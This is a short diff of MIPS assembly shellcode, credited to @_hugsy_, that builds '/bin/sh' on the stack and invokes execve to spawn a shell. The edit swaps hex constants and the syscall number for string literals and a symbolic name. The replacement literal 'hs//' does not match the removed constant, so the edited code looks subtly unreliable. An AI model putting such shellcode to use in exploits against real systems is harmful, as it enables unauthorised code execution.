@@ -3,11 +3,11 @@
 #
 # @_hugsy_
 #
-li $v0, 0x6e69622f
+li $v0, "nib/"
 sw $v0, 0($sp)
-li $v0, 0x0068732f
+li $v0, "hs//"
 sw $v0, 4($sp)
-li $v0, 11
+li $v0, __NR_SYS_execve
 move $a0, $sp
 li $a1, 0
 li $a2, 0
